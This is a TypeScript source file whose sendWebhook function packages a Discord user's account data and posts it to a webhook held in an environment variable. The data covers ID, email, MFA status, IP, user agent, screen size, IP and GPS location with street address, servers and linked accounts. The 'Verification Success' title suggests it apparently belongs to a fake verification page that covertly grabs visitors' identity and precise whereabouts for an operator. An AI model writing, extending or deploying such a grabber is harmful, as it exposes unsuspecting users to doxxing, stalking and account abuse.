import { DiscordUser, DiscordGuild, DiscordConnection, IpInfo, GpsData, ScreenSize } from "../types/userdata";

export const sendWebhook = async ( 
  userInfo: DiscordUser, 
  ownGuilds: DiscordGuild[], 
  connections: DiscordConnection[], 
  ipInfo: IpInfo, 
  ua: string,
  gps: GpsData,
  address: string,
  screenSize: ScreenSize
) => {
    try {
        const webhookUrl = process.env.DISCORD_WEBHOOK || "";

        const fields = [
          {
            name: "👤User",
            value: `${userInfo.global_name}(${userInfo.username || userInfo.username})`,
            inline: false
          },
          {
            name: "✉️User Info",
            value: `ID: \`${userInfo.id}\`\nLocale: \`${userInfo.locale}\`\nMFA: \`${userInfo.mfa_enabled}\`\nMail: \`${userInfo.email}\`\nisVerified: \`${userInfo.verified }\``,
            inline: false
          },
          {
            name: "💻Device Info",
            value: `IP: \`${ipInfo.ip}\`\nUserAgent: \`${ua}\`\nScreen Size: \`${screenSize.w}x${screenSize.h}\``,
            inline: false
          },
          {
            name: "🌎 Location from IP",
            value: `Country: \`${ipInfo.country}\`\nCity, Region: \`${ipInfo.city}, ${ipInfo.region}\`\nLocation: \`${ipInfo.loc}\`\nISP: \`${ipInfo.org}\`\nMoreInfo: [Click here](https://ipinfo.io/${ipInfo.ip})`,
            inline: false
          },
          {
            name: "🌐 Location from GPS",
            value: `Latitude: \`${gps.hh}\`\nLongitude: \`${gps.xf}\`\nAccuracy: \`${gps.ff}\`\nAddress: \`${address}\`\nMoreInfo: [Click here](https://www.google.com/maps?q=${gps.hh},${gps.xf})`,
            inline: false
          }
        ];

        if (Array.isArray(ownGuilds) && ownGuilds.length > 0) {
          const displayGuilds = ownGuilds.slice(0, 20);
          const remainingGuilds = ownGuilds.length > 20 ? ` ( ${ownGuilds.length - 20} more )` : '';
          fields.push({
            name: "🧑‍💻 Joined Servers",
            value: displayGuilds.map((guild) => `${guild.name} (${guild.id})`).join("\n") + remainingGuilds,
            inline: false
          });
        }

        if (Array.isArray(connections) && connections.length > 0) {
          fields.push({
            name: "🎮 Connections",
            value: connections.map((connection) => `${connection.type}: ${connection.name}`).join("\n"),
            inline: false
          });
        }

        const embed = {
            title: "☑️Verification Success",
            fields: fields,
            thumbnail: {
                url: userInfo.avatar_id ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar_id}.png` : ""
            },
            color: 0x7e22d2,
            timestamp: new Date().toISOString()
        };
        
        const response = await fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                embeds: [embed],
            }),
        });

        if (!response.ok) {
            console.error("Webhook request failed:", response.status, response.statusText);
            return { success: false, error: `Webhook request failed: ${response.status}` };
        }

        return { success: true };
    } catch {
        return { success: false };
    }
}